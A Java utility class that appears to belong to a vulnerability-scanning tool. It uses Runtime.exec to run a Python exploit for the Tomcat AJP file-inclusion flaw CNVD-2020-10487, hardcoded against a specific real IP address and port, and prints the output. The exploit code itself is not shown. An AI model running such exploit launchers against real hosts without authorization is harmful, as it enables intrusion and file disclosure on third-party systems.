package main.util;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

public class pythonexp {
    public static void main(String[] args) {
//        String a = pythontoexp("/usr/bin/python","pythonexp/Tomcat/CNVD-2020-10487-Tomcat-Ajp-lfi.py","221.226.213.174 -p 6009");

        String pythonscript = "pythonexp/Tomcat/CNVD-2020-10487-Tomcat-Ajp-lfi.py" ;
        String pythonpath = "python";
        String params = "221.226.213.174 -p 6009";;
        StringBuilder total = new StringBuilder();
        StringBuilder param = new StringBuilder();
        String[] paramlist = params.split(" ");
        String[] command = new String[50];
        command[0] = pythonpath;
        command[1] = pythonscript;
        for (int i = 2;i < paramlist.length+2; i ++)
            command[i] = paramlist[i-2];

        for (String s : command)
            System.out.println(s);
        System.out.println("66666");

        String[] commands = deleteArrayNull(command);

        for (String s : commands)
            System.out.println("*" + s);

        try {
            Process pro = Runtime.getRuntime().exec(new String[]{"/usr/bin/python","pythonexp/Tomcat/CNVD-2020-10487-Tomcat-Ajp-lfi.py","221.226.213.174","-p","6009"});
            InputStream is1 = pro.getInputStream();
            BufferedReader buf = new BufferedReader(new InputStreamReader(is1));
            String line = null;
            while ((line = buf.readLine()) != null) {
                total.append('\n').append(line);
                System.out.println(line);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // pythonpath即为python地址，如果配置了环境变量，可以直接输入对应的命令，如python、python3
    // pythonscript即为python脚本
    // params即为脚本的参数
    public static String pythontoexp(String pythonpath, String pythonscript, String params){
        String output = "";
        String[] commands = new String[100];
        commands[0] = pythonpath;
        commands[1] = pythonscript;
        StringBuilder param = new StringBuilder();
        String[] paramlist = params.split(" ");
        for (String s : paramlist) param.append(s+" ");

        try {
            Process pro = Runtime.getRuntime().exec(new String[]{commands[0],commands[1], String.valueOf(param)});
            InputStream is1 = pro.getInputStream();
            BufferedReader buf = new BufferedReader(new InputStreamReader(is1));
            String line = null;
            while ((line = buf.readLine()) != null) {
                System.out.println(line);
            }
        } catch (Exception e) {
            // TODO: handle exception
        }
        return output;
    }

    // 删除数组里为null的值
    public static String[] deleteArrayNull(String[] string) {
        String[] array = string;

        List<String> list= new ArrayList<>(array.length);

        try {
            for (String str : array) {
                list.add(str.trim());
            }
        }catch (NullPointerException e){
            ;
        }
        // 删除空的值
        while (list.remove(null));
        while (list.remove(""));

        // 将list 转换成数组
        String []list2 = list.toArray(new String[list.size()]);
        // 返回删除空值后的数组
        return list2;
    }
}
